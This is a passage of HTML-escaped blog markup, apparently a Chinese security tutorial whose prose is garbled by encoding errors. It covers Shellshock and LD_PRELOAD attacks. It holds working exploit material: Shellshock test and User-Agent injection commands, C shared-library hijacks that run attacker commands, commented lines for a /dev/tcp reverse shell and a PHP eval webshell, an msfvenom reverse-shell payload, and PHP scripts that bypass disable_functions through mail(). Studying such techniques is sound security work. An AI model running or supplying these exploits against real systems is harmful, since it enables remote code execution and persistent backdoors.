&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ env &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;() { :;}; echo vulnerable&amp;#39;&lt;/span> bash -c &lt;span style="color:#d88200">&amp;#34;echo this is a test &amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220323180512946.png" alt="image-20220323180512946">&lt;/p>
&lt;p>å¯¹äºvulhubçš„ç¯å¢ƒï¼Œè¿˜å¯ä»¥åœ¨UAå¤´æ³¨å…¥&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ curl -H &lt;span style="color:#d88200">&amp;#39;User-Agent: () { foo; }; echo Content-Type: text/plain; echo; /usr/bin/id&amp;#39;&lt;/span> http://127.0.0.1:8080/victim.cgi -i
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220323181632204.png" alt="image-20220323181632204">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220323181715322.png" alt="image-20220323181715322">&lt;/p>
&lt;p>å¯¹äºå½“æ—¶çš„å„å¤§webæœåŠ¡æ¥è¯´å½±å“ç›¸å½“å¹¿æ³›ï¼Œåªè¦æ˜¯è¿è¡ŒCGIç›¸å…³æœåŠ¡çš„ç³»ç»Ÿéƒ½å­˜åœ¨è¢«åˆ©ç”¨çš„å¯èƒ½ï¼ˆå› ä¸ºä¼šåœ¨åº•å±‚è°ƒç”¨bashï¼‰ï¼Œæ¯”å¦‚&lt;/p>
&lt;ul>
&lt;li>è¿è¡ŒCGIè„šæœ¬ï¼ˆé€šè¿‡mod_cgi å’Œ mod_cgidï¼‰çš„Apache HTTP æœåŠ¡å™¨ï¼›&lt;/li>
&lt;li>æŸäº›DHCPå®¢æˆ·ç«¯ï¼›&lt;/li>
&lt;li>ä½¿ç”¨Bashçš„å„ç§ç½‘ç»œæœåŠ¡ï¼›&lt;/li>
&lt;li>ä½¿ç”¨ForceCommandåŠŸèƒ½çš„ OpenSSH æœåŠ¡å™¨ï¼›&lt;/li>
&lt;li>ä½¿ç”¨CGIä½œä¸ºç½‘ç»œæ¥å£çš„åŸºäºLinuxçš„è·¯ç”±å™¨ï¼›&lt;/li>
&lt;li>ä½¿ç”¨bashçš„å„ç§åµŒå…¥å¼è®¾å¤‡ã€‚&lt;/li>
&lt;li>â€¦â€¦&lt;/li>
&lt;/ul>
&lt;h2 id="ld_preload">LD_PRELOAD&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define _GNU_SOURCE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">__attribute__&lt;/span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">__constructor__&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#111">preload&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ls / &amp;gt; /var/www/html/look&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// system(&amp;#34;bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34;);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// system(&amp;#34;echo \&amp;#34;&amp;lt;?php eval(\\$_POST[cmd]);?&amp;gt;\&amp;#34; &amp;gt; /var/www/html/ame.php&amp;#34;);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ gcc -fPIC -shared evil.c -o evil.so
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ msfvenom -a x64 --platform Linux -p linux/x64/shell_reverse_tcp &lt;span style="color:#111">lhost&lt;/span>&lt;span style="color:#f92672">=&lt;/span>192.168.31.29 &lt;span style="color:#111">lport&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8426&lt;/span> -f elf-so -o evil.so
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åŠ è½½æ¶æ„.soæ–‡ä»¶æ¥åŠ«æŒä»»æ„å‡½æ•°ï¼Œå¸¸å‡ºç°äºbypass disable_functionså’Œæ‰“redisä¸­&lt;/p>
&lt;p>å½“webæœåŠ¡æä¾›äº†è‡ªå®šä¹‰ç¯å¢ƒå˜é‡çš„æ¥å£ï¼Œä¹Ÿå¯ä»¥ç”¨å®ƒæ¥rce&lt;/p>
&lt;h3 id="bypass-disable_functions">bypass disable_functions&lt;/h3>
&lt;p>&lt;a href="https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/">æµ…è°ˆå‡ ç§Bypass disable_functionsçš„æ–¹æ³•&lt;/a>&lt;/p>
&lt;h4 id="getuid">getuid&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">geteuid&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">cmdline&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;EVIL_CMDLINE&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">getenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;LD_PRELOAD&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">NULL&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">unsetenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;LD_PRELOAD&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmdline&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ gcc -shared -fPIC test.c -o test.so
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;p&amp;gt; &amp;lt;b&amp;gt;example&amp;lt;/b&amp;gt;: http://test.com/exp.php?cmd=pwd&amp;amp;outpath=/tmp/xx&amp;amp;sopath=/var/www/html/exp.so &amp;lt;/p&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;cmd&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$out_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;outpath&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$evil_cmdline&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$cmd&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#34; &amp;gt; &amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$out_path&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#34; 2&amp;gt;&amp;amp;1&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;p&amp;gt; &amp;lt;b&amp;gt;cmdline&amp;lt;/b&amp;gt;: &amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$evil_cmdline&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;/p&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">putenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;EVIL_CMDLINE=&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$evil_cmdline&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$so_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;sopath&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">putenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;LD_PRELOAD=&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$so_path&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">mail&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;p&amp;gt; &amp;lt;b&amp;gt;output&amp;lt;/b&amp;gt;: &amp;lt;br /&amp;gt;&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#75af00">nl2br&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$out_path&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;/p&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">unlink&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$out_path&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>url/test.php?cmd=pwd&amp;amp;outpath=/tmp/xx&amp;amp;sopath=/var/www/html/test.so
&lt;/code>&lt;/pre>&lt;p>åŸç†æ˜¯åˆ©ç”¨&lt;code>mail&lt;/code>è§¦å‘&lt;code>sendmail&lt;/code>ï¼Œå†è§¦å‘&lt;code>getuid&lt;/code>ï¼ˆå·²è¢«æˆ‘ä»¬çš„.soåŠ«æŒï¼‰ï¼Œæœ€åæ‰§è¡Œå‘½ä»¤&lt;/p>
&lt;h4 id="preload">preload&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define _GNU_SOURCE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">extern&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">**&lt;/span> &lt;span style="color:#111">environ&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">__attribute__&lt;/span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">__constructor__&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#111">preload&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// get command line options and arg
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">cmdline&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;EVIL_CMDLINE&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// unset environment variable LD_PRELOAD.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// unsetenv(&amp;#34;LD_PRELOAD&amp;#34;) no effect on some
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// distribution (e.g., centos), I need crafty trick.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">environ&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">];&lt;/span> &lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">strstr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">environ&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#d88200">&amp;#34;LD_PRELOAD&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">environ&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;\0&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// executive command
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmdline&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc.so
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;p&amp;gt; &amp;lt;b&amp;gt;example&amp;lt;/b&amp;gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;amp;outpath=/tmp/xx&amp;amp;sopath=/var/www/bypass_disablefunc_x64.so &amp;lt;/p&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;cmd&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$out_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;outpath&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$evil_cmdline&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$cmd&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#34; &amp;gt; &amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$out_path&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#34; 2&amp;gt;&amp;amp;1&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;p&amp;gt; &amp;lt;b&amp;gt;cmdline&amp;lt;/b&amp;gt;: &amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$evil_cmdline&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;/p&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">putenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;EVIL_CMDLINE=&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$evil_cmdline&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$so_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;sopath&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">putenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;LD_PRELOAD=&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$so_path&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">mail&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;p&amp;gt; &amp;lt;b&amp;gt;output&amp;lt;/b&amp;gt;: &amp;lt;br /&amp;gt;&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#75af00">nl2br&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$out_path&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;/p&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">unlink&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$out_path&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>url/test.php?cmd=pwd&amp;amp;outpath=/tmp/xx&amp;amp;sopath=/var/www/html/test.so
